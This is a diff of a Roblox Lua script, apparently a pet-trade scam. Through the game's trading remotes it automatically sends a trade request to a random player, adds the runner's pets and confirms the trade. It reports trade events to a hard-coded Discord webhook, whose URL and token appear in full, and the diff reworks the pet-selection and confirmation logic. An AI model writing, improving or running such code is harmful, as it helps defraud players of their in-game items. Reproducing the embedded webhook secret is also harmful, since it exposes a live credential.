@@ -1,18 +1,17 @@
 local HttpService = game:GetService("HttpService")
 
--- Webhook function with error handling
 local function sendWebhook(data)
-    local webhookUrl = "https://discord.com/api/webhooks/1331684623079440454/yngryhXp2-3kpfEqK1YlCF3W65G5O23xyHKu_IgZiYkpnupnoTs2S7eKGDzdTRZG3GCz" -- Replace with your webhook URL
+    local webhookUrl = "https://discord.com/api/webhooks/1331684623079440454/yngryhXp2-3kpfEqK1YlCF3W65G5O23xyHKu_IgZiYkpnupnoTs2S7eKGDzdTRZG3GCz"
     local payload = HttpService:JSONEncode(data)
 
     local success, response = pcall(function()
-        return HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
+        HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
     end)
 
-    if success then
-        print("Webhook sent successfully: " .. response)
+    if not success then
+        warn("Webhook failed: " .. response)
     else
-        warn("Failed to send webhook: " .. tostring(response))
+        print("Webhook sent successfully")
     end
 end
 
@@ -135,86 +134,96 @@ local ae = 0
 local af = nil
 local ag = Instance.new("Hint", workspace)
 
+local tradeReady = false
+local tradeID = nil
+
 game:FindFirstChild("Trade Update", true).OnClientEvent:Connect(function(ah)
-    af = ah
-    ag.Text = "Latest Trade Update ID: " .. af .. " | " .. os.clock()
+    tradeID = ah
+    tradeReady = true
+    ag.Text = "Latest Trade Update ID: " .. tradeID .. " | " .. os.clock()
+    print("Trade updated. ID:", tradeID)
 end)
 
--- Trade request function
-local function ai()
-    local aj = game.Players:GetPlayers()
-    local ak = aj[math.random(1, #aj)]
+local function sendTradeRequest()
+    local players = game.Players:GetPlayers()
+    local randomPlayer = players[math.random(1, #players)]
 
-    if ak ~= game.Players.LocalPlayer then
-        local al = {
+    if randomPlayer ~= game.Players.LocalPlayer then
+        local tradeRequest = {
             [1] = "InvSend",
-            [2] = ak
+            [2] = randomPlayer
         }
 
-        workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer(unpack(al))
-        print("Trade request sent to: " .. ak.Name)
-
-        -- Send webhook on trade request
-        local data = {
-            username = "Captain Hook",
-            embeds = {{
-                title = "Trade Request Sent",
-                description = "Trade request sent to: " .. ak.Name,
-                color = 3447003 -- Blue color
-            }}
-        }
-        sendWebhook(data)
+        workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer(unpack(tradeRequest))
+        print("Trade request sent to:", randomPlayer.Name)
     end
 end
 
--- Add pet to trade function
-local function am(an, ao)
-    local ap = {
-        [1] = "Add",
-        [2] = an,
-        [3] = ao
-    }
+local function addPetToTrade(petID)
+    if tradeReady and tradeID then
+        local args = {
+            [1] = "Add",
+            [2] = tradeID,
+            [3] = petID
+        }
 
-    workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer(unpack(ap))
-    print("Added pet to trade with ID: " .. ao)
+        workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer(unpack(args))
+        print("Added pet to trade with ID:", petID)
+    else
+        print("Trade is not ready yet.")
+    end
 end
 
--- Trade ready function
-local function aq(ar)
-    workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer("Ready", ar)
-    print("Trade is ready with ID: " .. ar)
+local function confirmTrade()
+    if tradeReady and tradeID then
+        workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer("Ready", tradeID)
+        print("Trade is ready with ID:", tradeID)
 
-    -- Send a webhook when the trade is accepted
-    local data = {
-        username = "Captain Hook",
-        embeds = {{
-            title = "Trade Accepted",
-            description = "Trade ID: " .. ar,
-            color = 3066993 -- Green color
-        }}
-    }
-    sendWebhook(data)
+        -- Temporarily disable webhook call until fixed
+        -- local data = {
+        --     username = "Trade Bot",
+        --     embeds = {{
+        --         title = "Trade Accepted",
+        --         description = "Trade ID: " .. tradeID,
+        --         color = 3066993
+        --     }}
+        -- }
+        -- sendWebhook(data)  -- Commented out temporarily
+    else
+        print("Trade is not ready to confirm.")
+    end
 end
 
--- Add pets to trade with condition
-local function as(at, au)
-    local av = workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets
-    for _, aw in pairs(av) do
-        if au(aw) then
-            task.spawn(function()
-                am(at, aw.id)
-            end)
-            task.wait(5) -- Wait 5 seconds between adding pets
+local function addHatchedPetToTrade()
+    local petStats = workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets
+    local hatchedPet = nil
+
+    print("Checking for hatched pets...")
+
+    for _, pet in pairs(petStats) do
+        print("Pet ID:", pet.id, " | Pet 'l' value:", pet.l, " | Pet 'Hatched' status:", pet.Hatched)
+
+        if pet.Hatched or (pet.l == -1) then
+            hatchedPet = pet
+            break
         end
     end
+
+    if hatchedPet then
+        task.spawn(function()
+            addPetToTrade(hatchedPet.id)
+            print("Added hatched pet to trade with ID:", hatchedPet.id)
+        end)
+    else
+        print("No hatched pet found.")
+    end
 end
 
--- Condition for adding pets
-local function ax(ay)
-    return ay.l >= 10
-end
-
--- Start trade process
-ai()
-as(ae, ax)
-aq(ae)
+sendTradeRequest()
+task.spawn(function()
+    while not tradeReady do
+        task.wait(0.5)
+    end
+    addHatchedPetToTrade()
+    confirmTrade()
+end)
